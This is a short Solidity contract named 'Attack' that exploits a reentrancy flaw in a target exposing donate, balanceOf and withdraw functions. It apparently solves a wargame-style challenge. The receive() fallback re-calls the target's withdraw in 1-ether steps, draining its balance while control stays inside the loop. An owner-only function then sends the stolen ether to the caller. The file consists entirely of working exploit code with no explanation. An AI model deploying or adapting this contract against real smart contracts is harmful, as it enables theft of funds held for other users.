// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// import "hardhat/console.sol";

import "@openzeppelin/contracts/access/Ownable.sol";

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}

contract Attack is Ownable {
    IReentrance public targetContract;

    constructor(address target) {
        targetContract = IReentrance(payable(target));
    }

    function attack() external onlyOwner {
        targetContract.withdraw(targetContract.balanceOf(address(this)));
    }

    function withdraw() external onlyOwner {
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        require(success, "transfer failed");
    }

    receive() external payable {
        if (address(targetContract).balance >= 1 ether) {
            targetContract.withdraw(1 ether);
        }
    }
}
